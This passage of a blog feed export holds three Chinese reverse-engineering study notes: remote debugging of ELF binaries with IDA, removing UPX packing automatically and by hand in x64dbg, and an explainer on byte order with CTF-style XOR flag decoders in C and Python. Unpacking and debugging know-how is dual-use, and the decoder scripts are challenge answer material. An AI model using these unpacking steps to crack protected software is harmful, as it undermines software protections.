    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/IDA%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95/IDA%E8%B0%83%E8%AF%95elf%E6%96%87%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="IDA调试elf文件"><a href="#IDA调试elf文件" class="headerlink" title="IDA调试elf文件"></a>IDA调试elf文件</h1><p><a href="https://www.52pojie.cn/thread-730499-1-1.html">ida动态调试elf(无坑详细) - 吾爱破解 - 52pojie.cn</a></p><p><font style="color:rgb(79, 79, 79);">1.把ida中dbgsrv目录下的linux_server或者linux_serverx64放到linux中（根据自己要调试的程序选择哪个版本的）</font></p><p><img src="/./img/fmxPi7DDoX9kH8dH/1731551950474-b9f09d50-6ba1-4729-8d70-4d266ad1980d-524386.png" alt="1731551950474-b9f09d50-6ba1-4729-8d70-4d266ad1980d.png"></p><table><thead><tr><th><font style="color:rgb(68, 68, 68);">2.</font><font style="color:rgb(79, 79, 79);">chmod a+x linux_serverx64改变属性，然后运行 linux_serverx64</font></th></tr></thead></table><p><img src="/./img/fmxPi7DDoX9kH8dH/1731552001791-c5f90157-f1ff-476d-a9eb-dfc7f1f2731d-868195.png" alt="1731552001791-c5f90157-f1ff-476d-a9eb-dfc7f1f2731d.png"></p><p><font style="color:rgb(68, 68, 68);">3. 首先选择Romote Linux debugger，然后在process option中设置相关相关参数</font></p><p><img src="/./img/fmxPi7DDoX9kH8dH/1731552020880-9ce10238-54d1-4238-b560-e0685b914807-423383.png" alt="1731552020880-9ce10238-54d1-4238-b560-e0685b914807.png"></p><p><font style="color:rgb(68, 68, 68);">这里要注意</font><br><strong><font style="color:rgb(68, 68, 68);">很多失败的原因都是因为这个参数没设置好<br></font><strong><strong><font style="color:rgb(68, 68, 68);">很多失败的原因都是因为这个参数没设置好<br></font></strong></strong><font style="color:rgb(68, 68, 68);">很多失败的原因都是因为这个参数没设置好</font></strong><br><font style="color:rgb(68, 68, 68);"><br></font><br><font style="color:rgb(68, 68, 68);">重要的事说三遍，</font><font style="color:#ff0000;">Application和Input file的路径为linux中要调试程序的路径，包括程序</font><font style="color:rgb(68, 68, 68);">，</font><br><font style="color:rgb(68, 68, 68);"><br></font><br><font style="color:rgb(68, 68, 68);">比如这里&#x2F;home&#x2F;lql&#x2F;mywork&#x2F;other是调试程序存放的路径，WxyVM1是我们要调试的程序名，Directory设置为存放路径就可以了</font><br><font style="color:rgb(68, 68, 68);">第二个地方，</font><font style="color:#ff0000;">hostname要设置为linux的ip地址</font><font style="color:rgb(68, 68, 68);">，一开始我设置成localhost一直报错，说目标机器积极拒绝······</font><br><font style="color:rgb(68, 68, 68);">端口号默认即可，密码你没有特意设置也默认为空，上面的那个Parameters空着就好</font></p><p><img src="/./img/fmxPi7DDoX9kH8dH/1731552042826-9d9196c4-896a-4c8c-92b0-1dd34c6dcbd4-628194.png" alt="1731552042826-9d9196c4-896a-4c8c-92b0-1dd34c6dcbd4.png"></p><p><font style="color:rgb(68, 68, 68);">4. 到这一步可以说是快成功了，首先在ida中下断点，然后点</font><font style="color:#ff0000;">start process</font><font style="color:rgb(68, 68, 68);">，程序运行，在linux中就可以看到程序启动了（注意这里不是attach process，选择attach process会报错时候程序是在终端运行或者你没有权限）</font><br> <img src="/./img/fmxPi7DDoX9kH8dH/1731552059084-a3466cc0-acfd-4400-a74c-addc90658142-787132.png" alt="1731552059084-a3466cc0-acfd-4400-a74c-addc90658142.png"></p><p>5.就是调试过程了</p><blockquote><p>更新: 2024-11-14 10:41:13<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/wl0bt9fce8b1w69h">https://www.yuque.com/chaye-apqbl/vsc85q/wl0bt9fce8b1w69h</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E8%84%B1%E5%A3%B3/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E8%84%B1%E5%A3%B3/</url>
    
    <content type="html"><![CDATA[<h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><p><font style="color:rgb(38,38,38);">参考链接：</font><font style="color:rgb(17,124,238);"><a href="https://blog.csdn.net/qq_45323960/article/details/127883048">https://blog.csdn.net/qq_45323960/article/details/127883048</a>? </font></p><p><font style="color:rgb(17,124,238);">ops_request_misc&#x3D;&amp;request_id&#x3D;de0809d69d604e6ea51b6725ce365671&amp;biz_id&#x3D;&amp;utm_medium&#x3D;di </font></p><p><font style="color:rgb(17,124,238);">stribute.pc_search_result.none-task-blog-2<del>blog</del>koosearch~default-2-127883048-null</font></p><p><font style="color:rgb(17,124,238);">null.268^v1^control&amp;utm_term&#x3D;2022CTF%E5%9F%B9%E8%AE%AD&amp;spm&#x3D;1018.2226.3001.4450 </font></p><p><font style="color:rgb(17,124,238);"><a href="https://blog.csdn.net/weixin_45986910/article/details/107993680">https://blog.csdn.net/weixin_45986910/article/details/107993680</a> </font></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景 "></a><font style="color:rgb(38,38,38);">背景 </font></h1><p><font style="color:rgb(38,38,38);">壳实质上是⼀个⼦程序，在程序运⾏时⾸先取得控制权并对程序进⾏压缩，同时隐藏程序真正的OEP。 </font></p><p><font style="color:rgb(38,38,38);">脱壳的⽬的就是找到真正的OEP。 </font></p><p><font style="color:rgb(38,38,38);">OEP：程序的⼊⼝点，软件加壳就是隐藏了OEP（或者⽤了假的OEP）， 只要我们找到程序真正的 </font></p><p><font style="color:rgb(38,38,38);">OEP，就可以脱壳。 PUSHAD （所有寄存器压栈） 代表程序的⼊⼝点，POPAD （出栈） 代表程序的 </font></p><p><font style="color:rgb(38,38,38);">出⼝点。 </font></p><p><font style="color:rgb(38,38,38);">DLL(Dynamic Link Library)⽂件为动态链接库⽂件，很多Windows可执⾏⽂件并不是⼀个可以完整执⾏ </font></p><p><font style="color:rgb(38,38,38);">的⽂件，⽽是被分割成了多个DLL⽂件。当我们执⾏⼀个⽂件的时候，对应的DLL⽂件就会被调⽤。 </font></p><p><font style="color:rgb(89,89,89);">1</font><font style="color:rgb(38,38,38);">ITA(Import Address Table)：导⼊地址表。在不同版本的Windows系统中DLL的版本不同，那么我们需 </font></p><p><font style="color:rgb(38,38,38);">要借助ITA，获取函数的真实地址。 </font></p><p><font style="color:rgb(38,38,38);">分为压缩壳与加密壳 </font></p><h1 id="UPX壳"><a href="#UPX壳" class="headerlink" title="UPX壳"></a><font style="color:rgb(38,38,38);">UPX壳</font></h1><h2 id="文件特征"><a href="#文件特征" class="headerlink" title="文件特征"></a>文件特征</h2><p>4D 5A 90 00开头</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1722397048051-ab8719f5-61b4-4079-bcd8-53fd7726d4db-783769.jpeg" alt="1722397048051-ab8719f5-61b4-4079-bcd8-53fd7726d4db.jpeg"></p><h2 id="自动脱壳"><a href="#自动脱壳" class="headerlink" title="自动脱壳"></a><font style="color:rgb(38,38,38);">自动脱壳</font></h2><p><font style="color:rgb(38,38,38);">upx -d </font></p><p><font style="color:rgb(38,38,38);">常规</font></p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1717925027521-60d94ae0-5574-4c90-871c-5560b37e8c8d-685649.png" alt="1717925027521-60d94ae0-5574-4c90-871c-5560b37e8c8d.png"></p><p>发现有个upx壳，</p><p>.&#x2F;upx.exe -d attachment-15.attachment-15</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1717925197043-63f8fb4c-372a-49ca-835b-1e5341b320c3-336223.png" alt="1717925197043-63f8fb4c-372a-49ca-835b-1e5341b320c3.png"></p><p>即可完成脱壳</p><h2 id="手动脱壳"><a href="#手动脱壳" class="headerlink" title="手动脱壳"></a><font style="color:rgb(38,38,38);">手动脱壳</font></h2><p>打开发现有UPX壳</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721461309345-00b8f316-2ad4-4dca-a9fa-0d0e8fd30179-421296.png" alt="1721461309345-00b8f316-2ad4-4dca-a9fa-0d0e8fd30179.png"><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721461329304-9cab47c2-36be-4905-b848-07da03efeda1-601396.png" alt="1721461329304-9cab47c2-36be-4905-b848-07da03efeda1.png"></p><p>放入x64dbg，打开选项勾选入口断点</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721461390116-527415e4-6bff-4682-8d66-591e781c3e48-731924.jpeg" alt="1721461390116-527415e4-6bff-4682-8d66-591e781c3e48.jpeg"></p><p>F9 运行程序</p><p>F7 单点过完push</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721461502318-df6429cd-c5bd-47d9-8c04-542daeea7141-248103.jpeg" alt="1721461502318-df6429cd-c5bd-47d9-8c04-542daeea7141.jpeg"></p><p>到 push 的下一个指令，右键右边寄存器 RSP 选在内存窗口中转到</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721461688508-423f6a99-51fe-423b-bfd1-dafc3611abec-036555.jpeg" alt="1721461688508-423f6a99-51fe-423b-bfd1-dafc3611abec.jpeg"></p><p>在左下内存窗口的阴影处右键选断点 硬件，读取 2字节</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721461751384-f2d17d2c-591d-4107-ae44-333bee788fbd-775143.jpeg" alt="1721461751384-f2d17d2c-591d-4107-ae44-333bee788fbd.jpeg"></p><p>再 F9 运行程序</p><p>F7 单点执行到 jmp</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721461791740-4ef68d2c-c364-4676-a6cf-e5c96a6b3db3-038598.jpeg" alt="1721461791740-4ef68d2c-c364-4676-a6cf-e5c96a6b3db3.jpeg"></p><p>要多步过几次才能跳出循环，</p><p>然后跳转到这</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721462778032-481f1f2f-c5a9-474b-9d6c-02ae7c3d6fbe-514228.jpeg" alt="1721462778032-481f1f2f-c5a9-474b-9d6c-02ae7c3d6fbe.jpeg"></p><p>ctrl+i使用插件</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721462802787-eec10436-a97a-40a5-8e23-248675eebeee-012969.jpeg" alt="1721462802787-eec10436-a97a-40a5-8e23-248675eebeee.jpeg"></p><p>自动寻找IAT，然后dump下来</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721462819438-e6cfbfbc-e7ed-4ad6-9352-e22463100816-273933.jpeg" alt="1721462819438-e6cfbfbc-e7ed-4ad6-9352-e22463100816.jpeg"></p><p>将 × 的删掉， fix dump 一下</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721462879486-1b695a19-6253-4a45-bca6-fcf1661b9705-943508.jpeg" alt="1721462879486-1b695a19-6253-4a45-bca6-fcf1661b9705.jpeg"></p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721463089860-6dde9b59-d182-4b86-9afb-22c93f5741f0-763152.jpeg" alt="1721463089860-6dde9b59-d182-4b86-9afb-22c93f5741f0.jpeg"></p><p>然后用IDA打开就行</p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721463162459-dfbf1f30-0fd4-4780-891f-1c9c0b6ea522-333316.png" alt="1721463162459-dfbf1f30-0fd4-4780-891f-1c9c0b6ea522.png"></p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721463182729-ee0b5d34-89ec-4552-9cf0-83905cfdf15f-894008.png" alt="1721463182729-ee0b5d34-89ec-4552-9cf0-83905cfdf15f.png"></p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721463208740-c8802f77-02e3-45f5-88ac-7938a8c2dde9-888022.png" alt="1721463208740-c8802f77-02e3-45f5-88ac-7938a8c2dde9.png"></p><p><img src="/./img/49277317_2SYZoAfVYMhmv9Sl/1721463245110-0638e5ee-763c-4281-8224-266c7015efdf-680713.png" alt="1721463245110-0638e5ee-763c-4281-8224-266c7015efdf.png"></p><blockquote><p>更新: 2024-11-13 10:36:58<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/ic770vecloxmi8yz">https://www.yuque.com/chaye-apqbl/vsc85q/ic770vecloxmi8yz</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E7%AB%AF%E5%BA%8F/"/>
    <url>/2026/01/19/RE/%E5%9F%BA%E7%A1%80/%E7%AB%AF%E5%BA%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="端序"><a href="#端序" class="headerlink" title="端序"></a>端序</h1><p><a href="https://blog.csdn.net/qq_30576521/article/details/126684004?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172370670416800226592539%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172370670416800226592539&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-126684004-null-null.142%5Ev100%5Epc_search_result_base6&utm_term=%E7%AB%AF%E5%BA%8F&spm=1018.2226.3001.4187">什么是字节序（端序、低端字节序、高端字节序、网络字节序）-CSDN博客</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a><font style="color:rgb(79, 79, 79);">前言</font></h2><p><font style="color:rgb(77, 77, 77);">一个内容为12（</font><a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020"><font style="color:rgb(77, 77, 77);">字符串</font></a><font style="color:rgb(77, 77, 77);">）的文本文件，它的第一个字节是什么（小端序）？如果你的回答是0x32，那你真的应该好好理解下字节序了。如下图所示，我这里的正确答案是0x31。当然如果你的回答是不一定，这似乎也是对的。背后的原因比较复杂。</font></p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723706782004-973f6c61-6556-4e2d-aa61-021572968baa-866867.jpeg" alt="1723706782004-973f6c61-6556-4e2d-aa61-021572968baa.jpeg"></p><h1 id="什么是字节序"><a href="#什么是字节序" class="headerlink" title="什么是字节序"></a>什么是字节序</h1><p>首先，字节序又称端序，顾名思义“字节的顺序”。你可能会奇怪：字节还有顺序？让我们从生活中常见概念入手吧。</p><h2 id="生活中的数"><a href="#生活中的数" class="headerlink" title="生活中的数"></a>生活中的数</h2><p>123456，如果让你把这串数读出来的话你肯定会说：“十二万三千四百五十六。”你瞧，从左往右，这就是我们读数字时的顺序。</p><p>那有没有从右往左看数字的时候呢？当然有！如果我让你计算123456+134659你肯定会先从个位算起（除非你想给自己找麻烦）。</p><h2 id="把数存入内存"><a href="#把数存入内存" class="headerlink" title="把数存入内存"></a>把数存入内存</h2><p>计算机不是神仙，它和你没有心灵感应。因此为了使CPU可以读取数据，我们要先把数据存入内存再让CPU读取。内存是按地址进行访问的存储器件。在内存中，每个字节都有它对应的地址。</p><p>那么，你要如何把数0x12345678存入内存呢？</p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723706802115-3d78b1aa-ecaf-4412-af59-77cc883e8431-340131.png" alt="1723706802115-3d78b1aa-ecaf-4412-af59-77cc883e8431.png"></p><p><font style="color:rgb(77, 77, 77);">一种存储方式如下所示。</font><br><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723706810456-669f10dd-604d-47ed-b713-a43527885581-575669.png" alt="1723706810456-669f10dd-604d-47ed-b713-a43527885581.png"><br><font style="color:rgb(77, 77, 77);">当然你也可以选择另外一种存储方式。</font><br><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723706810599-a079363f-68bb-4317-bc8b-1a6643673cd3-724411.png" alt="1723706810599-a079363f-68bb-4317-bc8b-1a6643673cd3.png"><br><font style="color:rgb(77, 77, 77);">以上两种方式没有对错之分，只要在存储和读取时保持一致即可。Intel公司的CPU普遍采用第二种方式。</font></p><h2 id="字节序的小端序与大端序"><a href="#字节序的小端序与大端序" class="headerlink" title="字节序的小端序与大端序"></a><font style="color:rgb(77, 77, 77);">字节序的小端序与大端序</font></h2><p><font style="color:rgb(77, 77, 77);">像Intel这样把数的低字节存在内存低地址处的方案，我们称作小端序（Little-Endian），全称字节序的小端序，又称低（小）端字节序等。</font></p><p><font style="color:rgb(77, 77, 77);">反之，像第一种把数的高字节存在内存低地址处的方案，我们称作大端序（Big-Endian），全称字节序的大端序，又称高（大）端字节序等。</font></p><h2 id="端序-1"><a href="#端序-1" class="headerlink" title="端序"></a><font style="color:rgb(77, 77, 77);">端序</font></h2><p><font style="color:rgb(77, 77, 77);">你肯定要迫不及待地问，前文一直在说的端究竟是什么呢？顾名思义，端（end）就是一边、一头、一端的意思：</font></p><p><font style="color:rgb(77, 77, 77);">在内存中，我们以低地址为端；</font></p><p><font style="color:rgb(77, 77, 77);">网络传输中，我们以0时刻发送的数据为端。</font></p><p><font style="color:rgb(77, 77, 77);">因此字节序的大端序更精确的定义为：位置更高（重要，significant）的字节在端；相反，字节的小端序更精确的定义为位置更低（不重要）的字节在端。</font></p><p><font style="color:rgb(77, 77, 77);">大端序和小端序是两种不同的端序。现在Intel公司的CPU普遍采用字节小端序（字节序的小端序）。</font></p><p><font style="color:rgb(77, 77, 77);">因此下图以字节小端序读取的结果是0x78563412，以字节大端序读取的结果是0x12345678.</font></p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723706861152-ad03275a-6a5b-4397-a5ce-a7ab2f89a33f-580461.png" alt="1723706861152-ad03275a-6a5b-4397-a5ce-a7ab2f89a33f.png"></p><p><font style="color:rgb(77, 77, 77);"></font></p><p><font style="color:rgb(77, 77, 77);">注意： 当数据按上图在内存中存储时，不存在（至少据我所知，不存在） 0x87654321或者0x21345678这样的读取顺序.这是因为内存是以字节为最小单位进行存取的，所以字节内比特（位）的顺序总是固定不变的。当数据在网络中传输时就会涉及到字节内位的顺序。</font></p><p><font style="color:rgb(77, 77, 77);"></font></p><h1 id="数据在网络中传输"><a href="#数据在网络中传输" class="headerlink" title="数据在网络中传输"></a><font style="color:rgb(77, 77, 77);">数据在网络中传输</font></h1><h2 id="网络字节序"><a href="#网络字节序" class="headerlink" title="网络字节序"></a><font style="color:rgb(77, 77, 77);">网络字节序</font></h2><p><font style="color:rgb(77, 77, 77);">根据RFC791，网络传输时（精确地说是使用IP协议进行网络传输时）以太网采用大端字节序，即先发送位置更高（重要，significant）的字节。对于0x78563412来说0x78位置更高，因此应先发送0x78。</font></p><p><font style="color:rgb(77, 77, 77);">但是由此引发了一个问题，不管CPU是大端还是小端，根据RFC791 Figure 10，只要低地址0x34存着数据0x12，就应当先发送数据0x12（实际上，网卡发送数据时也都是从低字节处开始发送，不论端序如何）。而当在小端系统中存储0x78563412时，其在内存中的表示如下图所示。按照RFC791，将发送0x12，但是按照大端序，却应对先发送0x78. 因此C语言提供了htonl和ntohl这两个函数来帮我们解决主机字节序与网络字节序之间的转换问题。在发送数据前和接收数据后先通过这两个函数对字节序进行转换。</font></p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723706934575-b59c415d-3589-41ea-b6ca-461d7e34af53-699463.png" alt="1723706934575-b59c415d-3589-41ea-b6ca-461d7e34af53.png"></p><h2 id="网络比特序"><a href="#网络比特序" class="headerlink" title="网络比特序"></a>网络比特序</h2><p>以太网是串行传输数据的，即一次只能发送一个比特位。这样就引出了一个问题：我们知道，要想传输0x1234，需要先发送0x12这个字节，可是对于0x12我们应该先发送哪一位呢？</p><p>0x12的二进制写法是00010010B，因此有两种发送顺序。即，按照时间顺序依次发送0-0-0-1-0-0-1-0，或者反过来，发送0-1-0-0-1-0-0-0. 网络以0时刻为端，在发送0-0-0-1-0-0-1-0时比特的高位（重要的那一位）在端，我们称之为大端比特序；反之发送0-1-0-0-1-0-0-0时比特的低位（不那么重要的位）在端，我们称之为小端比特序。那么网络比特序是大端序还是小端序呢？</p><p>至于以太网在硬件层面是否真的是严格串行传输的，我并不清楚。因为ISO&#x2F;IEC&#x2F;IEEE 8802-3:2021居然有5千多页，鄙人才疏学浅，找不出来。</p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723706958726-e206e811-0b4c-402b-b54e-e2fd458de96b-170706.png" alt="1723706958726-e206e811-0b4c-402b-b54e-e2fd458de96b.png"></p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723706972220-41b281b5-79a4-445b-9866-1193f3158ac3-932101.png" alt="1723706972220-41b281b5-79a4-445b-9866-1193f3158ac3.png"></p><p>在RFC791和Linux内核中对于IP头部的定义如上图所示。可以发现，Linux为大端序和小端序提供的不同的定义。对于C的位域来说，先定义的成员位于低比特为，即0bit。对于小端系统，bit0至bit3为ihl，bit4至bit7为version。对于大端系统则反过来。根据RFC791要求，应当先发送version字段。对于网卡来说，先发送比特的高位（重要的那一位），再发送比特的低位（不重要的那一位）；网卡在接收bit数据的时候，同样认为先收到MSB(Most Significant Bit)，最后收到的位LSB(Least Significant Bit). 在小端系统中，MSB为bit7, LSB为bit0；在大端系统中，MSB为bit0, LSB为bit7.</p><p>综上所述，网卡会自动帮我们处理网络传输中的比特序问题。数据存取的最小单位通常是字节，而非比特，因此在一般的编程中，我们不必纠结于比特序的问题。</p><p>参考 <a href="https://blog.csdn.net/shaohui973/article/details/115766497">https://blog.csdn.net/shaohui973/article/details/115766497</a></p><h1 id="考考你"><a href="#考考你" class="headerlink" title="考考你"></a>考考你</h1><p>为了确保你真的懂了，现在考虑一个问题。假设有多字节数0x55AA需要发送，那么应该先发送哪一位或者哪一比特呢？</p><h2 id="从字节序的角度"><a href="#从字节序的角度" class="headerlink" title="从字节序的角度"></a>从字节序的角度</h2><p>以太网是字节序的大端序，因此对于0x55AA，先发送MSB，即0x55. 在小端系统中，0x55位于高字节，需经过htonl转换后再发送。</p><h2 id="从比特序的角度"><a href="#从比特序的角度" class="headerlink" title="从比特序的角度"></a>从比特序的角度</h2><p>首先明确肯定会先发送0x55这个字节（高端字节序）。0x55&#x3D;01010101B. MSB为0，因此发送顺序为0-1-0-1-0-1-0-1. 在大端系统中，0位于bit0,1位于bit7；在小端系统中，1位于bit0，0位于bit7. 无论大端小端，网卡都会先发送MSB。</p><h1 id="开头的问题"><a href="#开头的问题" class="headerlink" title="开头的问题"></a><font style="color:rgb(79, 79, 79);">开头的问题</font></h1><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723707133718-b904945b-aef2-4618-a9c0-61e2825941e6-483019.jpeg" alt="1723707133718-b904945b-aef2-4618-a9c0-61e2825941e6.jpeg"></p><p><font style="color:rgb(77, 77, 77);">严格地说，文件中没有“大小端序”这个概念，不然，文件在不同端序CPU的系统上将无法通用，这肯定是我们不希望看到的。</font><br><strong><font style="color:rgb(77, 77, 77);">在C#中，文件是按字节写入，因此不存在端序的问题</font></strong><font style="color:rgb(77, 77, 77);">——你想写什么就写什么。</font></p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723707149315-9660d60c-86c4-491c-b0d1-1b05152cba1a-938495.png" alt="1723707149315-9660d60c-86c4-491c-b0d1-1b05152cba1a.png"></p><p><font style="color:rgb(77, 77, 77);">在test1文件中，由于使用的是小端序CPU，变量的第一个字节自然是0x78，第二个字节是0x56……C#会直接把这个数组原封不动地写入文件。至于test2，字符1的utf-8编码是0x31，2是0x32……C#也会将他们原样写入文件。很多高级语言都是这样。</font></p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723707162582-c3ed46c8-eebe-46fb-807c-89a216510e5d-234647.png" alt="1723707162582-c3ed46c8-eebe-46fb-807c-89a216510e5d.png"></p><p>需要特别注意：在计算机中，字节序的概念被限制在CPU中，对于字节序的讨论应该和CPU息息相关。例如，汇编语言、操作系统等。 同理，关于比特序的讨论应该被限制在需要它的地方——网络的物理层&#x2F;数据链路层的底</p><p>部。像内存、硬盘这些设备只要符合规范，就可以在任何端序的CPU中使用。换句话说，它们本身都没有字节序的概念。</p><p>所以如果你拿着wireshark的截图问我：为啥在小端的CPU中出现了大端序，这个……我只能说它编程时就是这么设计的。毕竟这样你用起来更舒服。</p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1723707197419-3eae1b16-8402-4b2b-9ab5-ff1e521fa3dd-327489.png" alt="1723707197419-3eae1b16-8402-4b2b-9ab5-ff1e521fa3dd.png"></p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>CPU是个傻瓜，它并不清楚你的意图，只是按照你的指示做事。你要做什么，你自己是最清楚的。</p><p>好比我问你10100001B到底是有符号数还是无符号数，答案是：它既是无符号数161也是有符号数-95. 至于怎么解释完全取决于你自己。</p><p>书是从左往右读的，但古代的书都是从右往左读。这并不会影响书籍的内容，只要写和读的时候顺序一致即可。</p><h1 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h1><h2 id="1、easyenc"><a href="#1、easyenc" class="headerlink" title="1、easyenc"></a>1、easyenc</h2><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1727319130315-0c1a6aed-2fcd-4db6-b066-b1950bfa824b-004081.png" alt="1727319130315-0c1a6aed-2fcd-4db6-b066-b1950bfa824b.png"></p><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1727319515665-92b48750-5ba5-4efa-af18-233be95a278b-296913.png" alt="1727319515665-92b48750-5ba5-4efa-af18-233be95a278b.png"></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include&lt;stdio.h&gt;<br>#include&lt;string.h&gt;<br>int main()<br>&#123;<br>    char a[]=&#123;0x04,0xff,0xfd,0x09,0x01,0xf3,0xb0,0x00,0x00,0x05,0xf0,0xad,0x07,0x06,0x17,0x05,0xeb,0x17,0xfd,0x17,0xea,0x01,0xee,0x01,0xea,0xb1,0x05,0xfa,0x08,0x01,0x17,0xac,0xec,0x01,0xea,0xfd,0xf0,0x05,0x07,0x06&#125;;<br>    for(int i=0;i&lt;40;i++)<br>    &#123;<br>       printf(&quot;%c&quot;,(a[i]+86)^0x32);<br>    &#125;<br>    return 0;<br> &#125;<br></code></pre></td></tr></table></figure><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1727319798058-8bc4fef3-2949-4f66-a04d-6ed1456d8334-763142.png" alt="1727319798058-8bc4fef3-2949-4f66-a04d-6ed1456d8334.png"></p><h1 id="例题-1"><a href="#例题-1" class="headerlink" title="例题"></a>例题</h1><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1722055803247-78547ac8-f1ff-4ea9-8777-ae5722d3729d-654178.png" alt="1722055803247-78547ac8-f1ff-4ea9-8777-ae5722d3729d.png"></p><h2 id="data"><a href="#data" class="headerlink" title="data"></a>data</h2><p><img src="/./img/49277317_kdhn-uWnm_JKCqMR/1722055779926-9a7c3931-dbbc-41a2-9f91-aed6e672864c-071517.png" alt="1722055779926-9a7c3931-dbbc-41a2-9f91-aed6e672864c.png"></p><h2 id="epx"><a href="#epx" class="headerlink" title="epx"></a>epx</h2><h3 id="c"><a href="#c" class="headerlink" title="c"></a>c</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plain">#include&lt;stdio.h&gt;<br>#include&lt;string.h&gt;<br>#include&lt;math.h&gt;<br><br>int main() &#123;<br>int enc[6] = &#123; 0x51670536,0x5E4F102C,0x7E402211,0x7C71094B,0x7C553F1C,0x6F5A3816 &#125;;<br>int flag[6];<br>for (int i = 0; i &lt; 6; i++) &#123;<br>flag[i] = enc[i] ^ 0x12345678;<br>&#125;<br>for (int i = 0; i &lt; 6; i++)<br>&#123;<br>for (int j = 0; j &lt;= 3; j++)<br>&#123;<br>    printf(&quot;%c&quot;, (flag[i] &gt;&gt; (j * 8)) &amp; 0xFF);<br>&#125;<br>&#125;<br><br>return 0;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="python"><a href="#python" class="headerlink" title="python"></a>python</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plain">enc = [1365706038, 1582239788, 2118132241, 2087782731, 2085961500, 1868183574]<br>for i in enc:<br>    x = i ^ 0x12345678<br>    t = x.to_bytes(4, byteorder=&#x27;little&#x27;)<br>    y = t.decode(&#x27;utf-8&#x27;)<br>    print(y, end=&#x27;&#x27;)<br></code></pre></td></tr></table></figure><blockquote><p>更新: 2024-11-13 14:46:00<br>原文: <a href="https://www.yuque.com/chaye-apqbl/vsc85q/zwrl0m2023th2b7a">https://www.yuque.com/chaye-apqbl/vsc85q/zwrl0m2023th2b7a</a></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
